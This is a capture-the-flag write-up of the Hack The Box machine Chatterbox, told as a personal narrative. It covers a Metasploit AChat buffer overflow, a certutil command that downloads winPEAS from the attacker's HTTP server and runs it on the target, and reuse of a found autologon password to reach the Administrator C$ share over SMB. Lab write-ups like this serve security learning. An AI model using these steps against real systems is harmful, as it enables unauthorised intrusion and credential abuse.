### HTB Chatterbox  (10.10.10.74)

Here we are again, doing another HTB.  Hope this finds you well and let's get to it.

So first thing's first, we nmap to see what we're dealing with.

`sudo nmap -A 10.10.10.74`

![pic1nmap](/Images/HTB2Chat/Pic1nmap.png)
![pic2nmap](/Images/HTB2Chat/Pic2nmap.png)

Looks like we've got a windows machine on our hands.  Some SMB stuff too so that could prove intersting later.  At this point the guided approach in HTB had kinda stopped working.  It was asking how many ports were open and I would answer from this and it would be wrong.  I found a write up to check my work and appears I wasn't totally wrong, but I had too many.  I even tried adjusting my nmap scan.

`sudo nmap -A -p- 10.10.10.74`

And got still another answer, that was again, wrong lol.

![pic3nmap](/Images/HTB2Chat/Pic3nmap.png)

The answer you're looking for is 2.  Those two ports are the the focus, that we will get into now.

The next question in the guided mode asks about the known buffer overflow attack linked to achat.  After a google search I do end up finding an exploit for a version of achat.  Not sure if it's the version I am looking at though, so lets go about finding that.

Followed directions on the rapid7 site.

```
msf6 > use exploit/windows/misc/achat-bof
msf6 exploit(windows/misc/achat-bof) > show targets
```

![pic4metaspoit](/Images/HTB2Chat/Pic4metasploit.png)

And look at that, the version number.  And it just happens to match the exploit I found.  So lets give it a go.

In that same exploit, let's look at our options.

```
msf6 exploit(windows/misc/achat-bof) > set target 10.10.10.74
msf6 exploit(windows/misc/achat-bof) > set lhost <my vpn ip>
msf6 exploit(windows/misc/achat-bof) > show options
```

![pic5metasploit](/Images/HTB2Chat/Pic5metasploit.png)

`msf6 exploit(windows/misc/achat-bof) > run`

And it.....wait, it failed?!  Huh.  Ok, well let's try a different way.  So I found a couple things on git hub about using a buffer overflow for this.  It required using msfvenom in order to build out the vulnverability.  After finding that and getting it figured out (including finding out that these exploits were written in python2 and not python3), and a machine reset, I was finally able to get my exploit going for initial foothold.

![pic6cmd](/Images/HTB2Chat/Pic6cmd.png)

Hey hey!!  That did the trick.  Now that we're in as the user, lets go ahead and grab his flag.

![pic7userflag](/Images/HTB2Chat/Pic7userflag.png)

Now that I have that, let's get to getting the root one.

So first thing, grab us a bit of winpeas and then use python to start an http server and certutil.exe to grab the file over and run that.

```
root@kali# python3 -m http.server 80

C:/Users/Alfred/Documents> certutil -urlcache -f http://<VPN IP Address>/winpeasx86.exe winpeasx86.exe
C:/Users/Alfred/Documents> winpeasx86.exe
```

Once I got that run, then I look through the output and wouldn't you know it, there's an autologin set up.  And it's giving me the password to that.  Not to mention that we also see Alfred here has access to the admins home folders.

![pic8findings](/Images/HTB2Chat/pic8findings.png)

Turns out I don't have full access.  I still have the password though.

![pic9denied](/Images/HTB2Chat/pic9denied.png)


So let's try to do something with this password.  So after some looking, I find that the trick to this box is in the ports that are open.  I find a tool called plink.exe cause when looking at the netstat -ano command, you'll notice that there is an extra port on the inside that isn't showing up on the outside.

```
C:/Users/Alfred/Desktop>netstat -ano
```

![pic10SMB](/Images/HTB2Chat/pic10SMB.png)

Oh look, it's SMB.  We know all about SMB.  And actually, after looking, I found that SMB is apparently running on the outside.  Back to that earlier where it showed only 2 ports as being open.  So connect via SMB and try the Administrator account with the password we grabbed earlier for Alfred, since he's a local admin.

```
smbclient \\\\10.10.10.74\\C$ -U Administrator
Password for [WORKGROUP\Administrator]:
```
![pic11SMB](/Images/HTB2Chat/pic11SMB.png)

And that gives us our root.txt file.  Use SMB to download the file and then simply open it up and there's your flag!

![pic12SMB](/Images/HTB2Chat/pic12SMB.png)
![pic13root](/Images/HTB2Chat/pic13root.png)

This one was fun, a little sad that the plink path didn't work but it is what it is.  I think it may not have worked because that port was already on the outside so trying to forward something already forwarded may be an issue.  But, we got it, all good now.
